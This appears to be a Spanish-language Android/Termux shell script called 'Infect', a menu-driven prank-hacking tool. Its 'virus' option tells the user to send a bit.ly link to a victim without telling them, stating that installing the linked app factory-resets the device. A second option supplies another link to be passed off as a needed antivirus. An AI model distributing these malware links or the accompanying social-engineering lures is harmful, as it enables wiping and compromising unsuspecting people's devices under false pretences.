# A tool by nitro from www.noob-hackers.com
# Be a unique person not copy cat
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.1      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                       ▶codigo$grn Crazyhacking$red◀$rset"
echo -e "$red                      ⫸$ylo  CVE-Crazy Hacking$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Hackeando con diversion]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.2      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                       ▶Codigo$grn Crazyhacking$red◀$rset"
echo -e "$red                      ⫸$ylo  CVE-Crazy hacking ⫷$rset"
echo 
# Functions
echo -e "$red                    [Hackeando con diversion]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Opciones]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infectar ahora"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Guardar ahora"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Acerca de"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Actualizar script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribete"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Mas.."
echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Salir"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SELECCIONAR]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SELECCIONA UNA  OPCION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
upd
elif [ $optnz = "5" ];
then
am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMoB4GEGn9nJcr8Mi-7vwOA > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://github.com/CVECrazyhacking > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
am start -a android.intent.action.VIEW -d https://wa.me/59173197827 > /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m 😈 Copie el enlace a continuación y envíelo a su víctima y
no le digas nada. cuando lo instala en su
dispositivo se restablecerá de fábrica y sucederá mucho más.
                                👇👇👇

         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m

                                 👆👆👆
Úselo solo para fines divertidos, no para dañar a alguien 😇✌️.
Y nuestro canal no se hace responsable de ningún tipo de pérdida."
echo
echo -ne "\e[92m#Escribe exit para salir: "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo " "
echo -e "\e[93m  Copie el enlace de abajo y envíelo a su víctima y dígale
que debe instalar esta aplicación o su
el dispositivo no se recuperará. (Antivirus)
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    👆👆👆
Úselo solo para fines divertidos, no para dañar a alguien 😇✌️.
Y nuestro canal no se hace responsable de ningún tipo de
pérdida ".
echo
echo -ne "\e[92m#escribe exit para salir: "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
'
echo -e "\e[93m                  LLAMAME \e[92mMRX" | pv -qL 10
echo -e "\e[93m             SOY DE  \e[92mCVE-Crazy hacking" | pv -qL 10
echo -e "\e[93m        \e[92m\e[93m " | pv -qL 10
echo -e "\e[93m             IDON´T EVER GIVE UP" | pv -qL 10
echo -e "\e[93m          " | pv -qL 10
echo -e "\e[93m              \e[92m" | pv -qL 10
echo -e "\e[93m        CANAL DE YOUTUBE:\e[92m https://www.youtube.com/channel/UCMoB4GEGn9nJcr8Mi-7vwOA \e[0m" | pv -qL 10
echo -e "\e[92m                SALUDOS.............." | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/infect" ];
then
cd $HOME
rm -rf infect
elif [ -d "$HOME/Infect" ];
then
cd $HOME
rm -rf Infect
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mACTUALIZACIÓN ESTÁ EN MARCHA, POR FAVOR ESPERE UN MOMENTO ...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           ACTUALIZACION CORRECTA (NUEVA VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd infect
bash infect.sh
}
vid(){
FILE=$HOME/infect/noob.noob
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
echo -e "\e[96m                ║  \e[93mACABO DE SUBIR UN NUEVO\e[96m VIDEO   ║\e[0m"
echo -e "\e[96m                ║      MIRALO AHORA.....!    ║\e[0m"
echo -e "\e[96m                ║                                   ║\e[0m"
echo -e "\e[96m                ║        Selecciona \e[92my\e[96m para mirar\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║        Selecciona \e[91mt\e[96m para cancelar\e[96m         ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║     Selecciona \e[91mz\e[96m para salir de todo\e[96m       ║\e[0m"
echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
echo -en "\e[32mSELECCIONA UNA OPCION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMoB4GEGn9nJcr8Mi-7vwOA 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/infect
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu
